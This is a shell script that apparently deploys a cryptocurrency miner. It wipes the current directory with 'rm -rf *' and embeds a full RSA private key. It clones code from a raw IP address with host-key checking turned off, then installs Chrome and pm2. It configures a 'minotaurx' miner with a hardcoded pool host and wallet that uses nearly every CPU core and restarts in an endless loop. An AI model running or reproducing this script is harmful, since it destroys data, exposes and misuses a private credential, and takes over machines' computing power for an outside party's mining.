#!/bin/sh

echo "File listing before cleaning!"
sleep 4
ls -la

sleep 2
echo " "
echo " "
echo " "
sleep 2

echo "File listing after cleaning!"
sleep 4
rm -rf *
sleep 4
ls -la
sleep 2

ssh-keygen -m PEM -t rsa -b 4096 -f ~/.ssh/id_rsa -q -N ""

sleep 2

cat > ~/.ssh/mikrotik999 <<EOL
-----BEGIN RSA PRIVATE KEY-----
MIIJKAIBAAKCAgEAvWuvZZxchoYG1xCfXqHah8awmUJpqN1p8NLGFq3G7F7UX/81
k42vfRcRQkXuMAo9pmaHRku4A35yKBN7TuUQtfSJI7NoS+8JS4ySIp+PjXezj3Yp
eZ4wA1/1UF7W+MLJcCpsMelNmQCC2TCXzFhKtyOZDYdc6bzpnPvgUO8iuVIO2fzl
JvWuJUMt4kysLwn09g0t8JKmo9KzkEqxDeJVnwUMjaNRHMSkGjQIbz98y54HzE8U
Wot7WLgjQq5IBIELYv3mVcHgvyzVStL9V8Y5TBuyRC+maU0QrDkdpVQ4Q/WOuU2Y
zcFIPDLMYNpeUqI86gYkrknxAWAjNXi1DvD/6/VISYoNGEBLCVocQkxi2czBTlOO
qmvDVo3oT7ckS+Z7mjliKmjyESGmhEsAO49RYtYiPPm7zHT0YRvVXq7V9zVVQfrA
tiW4p6VRIOPk2j8k4pRYyFwU51EwZE4a9QfcUug1qTV1LWUHNBFc8C+5V/Wv4Vcz
Hn79HuYme50fSYyTkg5/CgXDcyuB3A5wfQLpPZkxzhlGeOn6WTkL4kKiJp2EjXjG
DSiwhE3elqrLcvi84hEMsPMdoLO3fDKw5ZTN3WFdbPTPIt+b4a6hBF3eajWj8EPi
n4QCYTITtMtLPdft25lM5r5m75bM81xceEU11jx6mRaX8t9st6MoZEWHiiMCAwEA
AQKCAgBMIPDz6iVnrYsnOZeLvYoqQqksV3xGsYJIFzYk3D/UNQKu+E+sl2e94xz9
IUTrCtqfO5rHnlv9D39K6xWGblrKflb1wb+7sPzv37XF85IK3d6NXISry+9pE9Jw
tEU64nJ6QZqNbsJQqVttdfG0X5HbzBNR1CL8EABmJvcPICU5DSlJ5DGm+Fu+vyK8
TmtvVlWc5Ewf4ZjWw7KGXfaN6XbW+/0BGe/aG5AGtf3j1ETQQxnIO8om3+M5k3wc
axYntUOBzCCcO9kbjKXGtki608CofYMmk24S6TW3uhbXoSMh8RmlEPJGU5W4GAR7
MphxJqJLvh9U6wPRNTXBYluGf0ajeapDdZolU18da+3x2r3wBCUX+feuPGS6IZAF
N7nYjAbLkzNTvndPBiEbJDUE6JRlnjB6mZdNZSBt8NFxl3wJ6MY61Mr8q5Nyg2Sg
lBvfH9askBBDeArZ5eb7kS0/W80T2cfxX6x/E1l/XoJ7G8XBDMLQeokj0KAhpdnm
suSYcJfh/9ufUbey48GnXywCIFcIay9qjf+tU68rNpZekr+lr7Oh+Cx7t9qDCozB
WKB3BW8LQKU1LZtqbq+VP54l/oY4OJv0DD2YkWPgtEt+Wt9KaNwwBBoPM9SJmUy/
qD7inaZLlynGNIgyvKLFV7X9OCRYQJAuiPj6Sh4Irxg+YtSDpQKCAQEA7zuvXe3Q
kvjxlrRPN0KyZwGNd+K8g2+5XowWKa2decpnSH4MjWrVz9MZAnjIyHXkYwy3DSbx
rGuLhjq3Nub25pEWIMEbcmUJTY0wAVgu+u95/0B4552VxL/X21dcr1oiV81k5/WC
X/SWy+ZiAtUtbtHw2ANtDzrX9nZBj5IlpddLGJIfMp/dGNjUDvrRRccsVRmHDwIN
t015bvvmgY3voMa9ymsnNQerCGoEAFWOihZQ3pnicwoXmCQhrY/P0eS3Xw/PuzKP
wFJxXP3IXMG5NgEgbXHWHydbE/ojq19hbWHzKdp2jySZVek9ZCtbgcGEZkTBuTTS
tfElt0qCJ1dFdQKCAQEAyrJD+UPl30N6It1p3oocTpeE9TKaH0AbdGAIM2PQSuKl
B8VowsmTS0EfVYgpXctVcrV9RfmjcVISEddqNrJfpARsl1m7L7tXZ1RTUHXEqSjV
MVBlG0ADA7/WqHR3LagzP3tly0qQhZRv32hb+RbLnkbt4kDeU8Df90dU05txmFi8
ld+1BUVL3ywTFZnrtRz3maepxN1ghJHWE8l1gslD9sQQXVEFClZRnAlOuEOAX6S8
90D5EoehrU5HkgcVvr+yyL+9qAGZLqsImmnUwhTUpbUutFIINKVSJx2u8/6rSPti
pT/MIWo91KQvoVteENkb9//57Mep7m9mCagriU9mNwKCAQBn5XXdxyBkE/Vny9rz
VuX/0i7MOA5CzsykgRZG932CnSKJ2yQ8bn95CGa+KhKY7IpJcgY1kgo3JWWs3+cd
0uS7cZs4kmUHI1YM9ho5G0Eb/dDvx+I6RLf8gIyQV7qK9QwhMbR3AKqkXab32pAK
Rua6UDbWuXYtvRJ5mRYT8hajlYKpoxwlckQlPFWsQ8WLFlrsgm+jVvL5/o2UY5XS
AgBlxKo8NJkMcM4Yk2I1evKyicqJQi+UYneovVha9i/9KeVxRX6j/+tqTOOqzRSt
I/z5tTeOEHg7g24MmP/Qt1WqmXVvYc9Hj0+AfhEJZcMR8Sc8+vNfKc+w8I++sH8h
8sbZAoIBACDlRXrSth/Bx7SY0nG3YFiw5ncUu0aPFOWSIEKW1FsS5U2ZkCLsq+bu
rrMm4e/C7B8trSMKHKhrdVtH5ojx8eugfC8j9OkOMmUmnk7UjhIV+mOCdKYzgUm+
fIviOuVCAu8ui5qugz3qlS1gtmx6cplBUaICfRKCntZ20SF2fL0IybJZF/u+/008
zewXitVd2iEpwLeeZeed82xKqbOMDmeh8jXyzCqdT6lPKWNmMRNUnQZTmRiUwnxp
09uzIqhOXCmQVKtLdxzHzSGiQ1EsKEasXOQO3B4PJoIKozYeApZZlezTqcFSiK5V
5xT8ywtY8N0SwfDXhpCXq6uti0NBi4kCggEBAJlI6WgbRerzXl+bFN5QWW/8KDr5
v/JPk3ozFDtgrRa27YLYbY9WF/S/92foZDqNWBZy3IdWeFB/Gl2DNFKsFiDQu9X1
vg72HLMQkxS/Xlcaq/aq5RCoiysFEoNzo1GKheN5OoIqynKorh9+gARijndlzPSd
wiDCwOKe6iOmSJdsZKTcZX/FGEatDzq/UxbvqLC0uGx1z1F7bAwWVZUuMSOUyZO5
UZYbmQxfcvxoCGUpm/P85iSxMu4GvyfrNyELB5AKKtqV0/mY25/wJ4yzEV2DTD9s
EODk2sLk7EOww3ehBO0/V3Dr1Ix1mWpYh4HvXO4d84iS1LMkO3Z9eNeUm68=
-----END RSA PRIVATE KEY-----
EOL

sleep 2

chmod 600 ~/.ssh/mikrotik999

sleep 2

GIT_SSH_COMMAND='ssh -i ~/.ssh/mikrotik999 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no' git clone git@45.135.58.52:/srv/git/project.git mywork

sleep 4

ls -la

cd mywork

sleep 2

tar -xf backup5.tar.gz

sleep 4

ls -la

./dist/proot -S . /bin/bash
su -
sleep 3
whoami
sleep 3
ls -la
sleep 3

cd chrome-mint

# Install dependencies
npm install

sleep 2

wget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add -
echo "deb http://dl.google.com/linux/chrome/deb/ stable main" | tee /etc/apt/sources.list.d/google.list

sleep 2

apt-get update
apt-get install -y google-chrome-stable

sleep 2

npm install pm2 -g

sleep 2

#pm2 set pm2:sysmonit true

sleep 2

#pm2 update

sleep 2


DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null

sleep 2

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

sleep 2

TZ='Africa/Johannesburg'; export TZ
date 
sleep 2 

rm config.json

sleep 2

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Circ_')
ipaddress=$(curl -s api.ipify.org)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 2`

echo ""
echo "You have a total number of $used_num_of_cores cores"
echo ""

echo ""
echo "Your worker name is $currentdate"
echo ""

sleep 2


#./update/update bash

cat > config.json <<END
{
  "algorithm": "minotaurx",
  "host": "flyingsaucer-eu.teatspray.fun",
  "port": 7019,
  "worker": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8",
  "password": "$currentdate,c=MAZA,zap=MAZA",
  "workers": $used_num_of_cores,
  "fee": "1"
}
END

sleep 5

echo "Your worker name is $currentdate"

sleep 2

while true
do
pm2 start index.js --watch
sleep 5
pm2 stop index.js
sleep 5
pm2 delete index.js
sleep 5
pm2 start index.js --watch
sleep 21600
done
